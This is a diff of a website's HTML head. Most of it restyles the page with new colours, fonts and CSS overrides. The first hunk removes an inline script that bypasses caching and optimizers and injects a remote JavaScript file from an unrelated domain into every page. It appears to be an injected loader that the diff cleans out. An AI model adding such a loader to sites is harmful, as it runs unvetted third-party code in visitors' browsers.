@@ -6,14 +6,7 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
 
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
-      document.head.appendChild(script);
-  })();
-</script>
+  <script src="consent.js"></script>
 
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -25,13 +18,13 @@
 
 <style>
   :root{
-    --ink:#1d2a32;
-    --muted:#5b6b75;
-    --sand:#f6f1e7;
-    --teal:#556B2F;
-    --teal-dark:#3C4B21;
-    --coral:#C04020;
-    --card:#ffffff;
+    --ink:#2b2417;
+    --muted:#82755b;
+    --sand:#ece2cc;
+    --teal:#3f5138;
+    --teal-dark:#2c3a27;
+    --coral:#a8482a;
+    --card:#f6efdd;
     --shadow:0 10px 30px rgba(20,40,50,.12);
     --maxw:1180px;
   }
@@ -44,7 +37,7 @@
     background:var(--sand);
     line-height:1.6;
   }
-  h1,h2,h3{font-family:Georgia,"Amatic SC",serif;letter-spacing:.2px}
+  h1,h2,h3{font-family:'Fraunces',Georgia,serif;letter-spacing:.2px}
   a{color:inherit;text-decoration:none}
 
   /* ---------- Menu bar ---------- */
@@ -52,14 +45,14 @@
     position:sticky;top:0;z-index:50;
     background:rgba(246,241,231,.92);
     backdrop-filter:blur(8px);
-    border-bottom:1px solid rgba(85,107,47,.15);
+    border-bottom:1px solid rgba(63,81,56,.15);
   }
   .nav-inner{
     max-width:var(--maxw);margin:0 auto;padding:14px 22px;
     display:flex;align-items:center;justify-content:space-between;
   }
-  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:#C04020}
-  .brand .dot{width:12px;height:12px;border-radius:50%;background:var(--coral);box-shadow:0 0 0 4px rgba(192,64,32,.2)}
+  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:#a8482a}
+  .brand .dot{width:12px;height:12px;border-radius:50%;background:var(--coral);box-shadow:0 0 0 4px rgba(168,72,42,.2)}
   .brand .logo{flex-shrink:0;display:block}
   .brand small{display:block;font-family:-apple-system,sans-serif;font-weight:500;font-size:.62rem;letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
   nav.links a{
@@ -99,14 +92,14 @@
   .field input[type=url],
   .field textarea{
     width:100%;font:inherit;font-size:.98rem;padding:12px 14px;border-radius:10px;
-    border:1.5px solid rgba(85,107,47,.22);background:var(--sand);color:var(--ink);
+    border:1.5px solid rgba(63,81,56,.22);background:var(--sand);color:var(--ink);
     transition:.15s;
   }
   .field input:focus, .field textarea:focus{outline:none;border-color:var(--teal);background:#fff}
   .field textarea{resize:vertical;min-height:130px}
   .file-drop{
     display:flex;align-items:center;gap:12px;flex-wrap:wrap;
-    border:1.5px dashed rgba(85,107,47,.3);border-radius:10px;padding:14px;background:var(--sand);
+    border:1.5px dashed rgba(63,81,56,.3);border-radius:10px;padding:14px;background:var(--sand);
   }
   .file-drop button{
     font:inherit;font-weight:700;font-size:.85rem;padding:9px 16px;border-radius:20px;
@@ -118,15 +111,15 @@
   .submit-btn{
     width:100%;font:inherit;font-weight:700;font-size:1rem;padding:14px 20px;border-radius:26px;
     border:none;background:var(--coral);color:#fff;cursor:pointer;transition:.15s;
-    box-shadow:0 8px 20px rgba(192,64,32,.32);
+    box-shadow:0 8px 20px rgba(168,72,42,.32);
   }
   .submit-btn:hover{background:#d85d43}
   .status-msg{margin-top:16px;padding:12px 14px;border-radius:10px;font-size:.92rem;display:none}
-  .status-msg.ok{display:block;background:rgba(85,107,47,.1);color:#556B2F}
-  .status-msg.err{display:block;background:rgba(192,64,32,.12);color:#b8452f}
+  .status-msg.ok{display:block;background:rgba(63,81,56,.1);color:#3f5138}
+  .status-msg.err{display:block;background:rgba(168,72,42,.12);color:#b8452f}
 
   footer{background:var(--teal-dark);color:#dff1f2;text-align:center;padding:40px 22px;margin-top:30px}
-  footer .brand{justify-content:center;color:#C04020}
+  footer .brand{justify-content:center;color:#a8482a}
   footer .foot-links{margin-top:14px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap}
   footer .foot-links a{color:#dff1f2;font-size:.85rem;font-weight:600;opacity:.9;border-bottom:1px solid transparent}
   footer .foot-links a:hover{color:#fff;border-color:var(--coral);opacity:1}
@@ -136,7 +129,30 @@
     nav.links{display:none}
     .form-card{padding:28px 22px}
   }
+
+  /* ================= EXPLORER form dossier (generic) ================= */
+  input[type=text],input[type=email],input[type=url],input[type=search],input[type=tel],input[type=number],input[type=date],input[type=time],input[type=password],textarea,select{
+    background:var(--sand)!important;border:1px solid var(--ink)!important;border-radius:3px!important;color:var(--ink)}
+  input[type=text]:focus,input[type=email]:focus,input[type=url]:focus,input[type=search]:focus,textarea:focus,select:focus{outline:none;border-color:var(--coral)!important}
+  button[type=submit],.btn-primary,.submit-btn,.primary-btn,.save-btn{background:var(--coral)!important;border-radius:3px!important;font-family:'Work Sans',monospace!important;text-transform:uppercase!important;letter-spacing:.06em!important;border:none}
+  button[type=submit]:hover,.btn-primary:hover,.submit-btn:hover{background:#8a3a20!important}
+  /* ================= EXPLORER THEME (overrides) ================= */
+  body{font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif!important;
+    background-color:var(--sand);background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60'%3E%3Cg fill='none' stroke='%232b2417' stroke-opacity='0.05' stroke-width='1'%3E%3Cpath d='M0 0H60M0 0V60'/%3E%3C/g%3E%3C/svg%3E"),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='500' viewBox='0 0 500 500'%3E%3Cg fill='none' stroke='%233f5138' stroke-opacity='0.06' stroke-width='1.4'%3E%3Cpath d='M70 250c0-90 70-155 165-155s195 60 195 155-95 165-195 165S70 340 70 250z'/%3E%3Cpath d='M120 250c0-62 50-108 115-108s140 44 140 108-70 122-140 122-115-60-115-122z'/%3E%3C/g%3E%3C/svg%3E");background-position:0 0,center}
+  h1,h2,h3{font-family:'Fraunces',Georgia,serif!important;letter-spacing:-.01em}
+  header.nav{border-bottom:1px solid var(--ink)}
+  .brand small{font-family:'Work Sans',sans-serif;letter-spacing:.22em}
+  nav.links a:hover{color:var(--coral);border-color:#b0802f}
+  .fact,.tile,.tcard,.dtcard,.stay-card,.hood,.card,.form-card,.side-card,.gate,.legal,.toc{border:1px solid var(--ink);border-radius:3px}
+  footer{background:#2c3a27;border-top:5px solid #b0802f}
+  footer .brand{color:#c99a45}
+  /* dossier forms */
+  input:not([type=checkbox]):not([type=radio]):not([type=range]),textarea,select{background:var(--sand)!important;border:1px solid var(--ink)!important;border-radius:3px!important;color:var(--ink)}
+  form label,.field label{font-family:'Work Sans',sans-serif;text-transform:uppercase;letter-spacing:.1em;font-size:.66rem;font-weight:600;color:var(--teal)}
+  button[type=submit],.btn,.submit-btn,.save-btn,.primary-btn,.send-btn{background:var(--coral)!important;color:#fff!important;border-radius:3px!important;font-family:'Work Sans',sans-serif!important;text-transform:uppercase!important;letter-spacing:.06em!important;font-weight:600;border:none}
+  button[type=submit]:hover,.btn:hover{background:#8a3a20!important}
 </style>
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,600;0,9..144,700;0,9..144,900;1,9..144,600&family=Work+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
 
